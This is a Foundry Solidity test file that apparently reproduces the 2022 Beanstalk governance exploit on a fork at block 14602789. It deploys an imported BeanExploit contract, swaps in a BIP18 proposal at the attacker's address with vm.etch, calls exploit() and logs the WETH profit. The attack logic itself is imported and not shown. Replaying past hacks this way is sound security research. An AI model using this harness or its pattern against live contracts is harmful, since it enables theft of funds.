// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../exploit/BIP18.sol";
import "../exploit/BeanExploit.sol";


// Hack occured  @ Block Number => 14602789

contract BeanExploitTest is Test {
    BeanExploit bean;
    BIP18 bip18;
    address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    function setUp() public {}

    function fixtures() public {
        // Deploy exploit contract.
        bean = new BeanExploit();
        vm.label(address(this), "Outer Test");
        vm.label(address(bean), "BeanExploit");
        console.log("BeanExploit Initialized");
        // Deploy proposal
        bip18 = new BIP18(address(bean));
        console.log("Bip18 Initialized");

        /** 
            Replace the attacker's BIP18 proposal with our BIP18
            on the same address to save some steps.
        */
        vm.etch(
            0xE5eCF73603D98A0128F05ed30506ac7A663dBb69,
            getCodeIt(address(bip18))
        );
        console.logBytes(at(0xE5eCF73603D98A0128F05ed30506ac7A663dBb69));
        // console.logBytes(at(address(bean)));
    }

    function test() public {
        /**
            We are impersonating te attacker which reduces steps to voting.
        */
        console.log("Balance in WETH before", IERC20(WETH).balanceOf(address(bean)));
        fixtures();
        console.log("Calling bean.Exploit()");
        bean.exploit();
        console.log("Profit in WETH", IERC20(WETH).balanceOf(address(bean)));
    }

    // ----------------- Util Function -----------------
    function getCodeIt(address who)
        internal
        view
        returns (bytes memory o_code)
    {
        /// @solidity memory-safe-assembly
        assembly {
            // retrieve the size of the code, this needs assembly
            let size := extcodesize(who)
            // allocate output byte array - this could also be done without assembly
            // by using o_code = new bytes(size)
            o_code := mload(0x40)
            // new "memory end" including padding
            mstore(
                0x40,
                add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f)))
            )
            // store length in memory
            mstore(o_code, size)
            // actually retrieve the code, this needs assembly
            extcodecopy(who, add(o_code, 0x20), 0, size)
        }
    }
    function at(address _addr) public view returns (bytes memory o_code) {
        return _addr.code;
    }
}
